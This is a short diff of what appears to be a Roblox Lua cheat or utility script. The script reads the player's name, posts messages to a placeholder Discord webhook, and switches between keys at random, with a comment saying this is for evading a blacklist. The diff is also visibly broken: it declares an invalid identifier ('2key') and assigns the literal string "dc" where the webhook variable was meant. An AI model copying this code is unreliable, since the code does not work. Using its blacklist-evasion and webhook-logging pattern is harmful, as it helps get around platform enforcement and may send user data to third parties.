@@ -2,6 +2,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local key = "put-key-here"
 local 2key = "put-2key-here"
+local dc = "DISCORD_WEBHOOK"
 
 if LocalPlayer then
     local playerName = LocalPlayer.Name
@@ -64,7 +65,7 @@ function SendMessageEMBED(url, embed)
 end
 
 
-local url = "DISCORD_WEBHOOK"  -- discord webhook (optional)
+local url = "dc"  -- discord webhook (optional)
 
 coin_flip = math.random(0, 1) -- randomize key for evading blacklist (optional to do)
 if coin_flip == 0 then
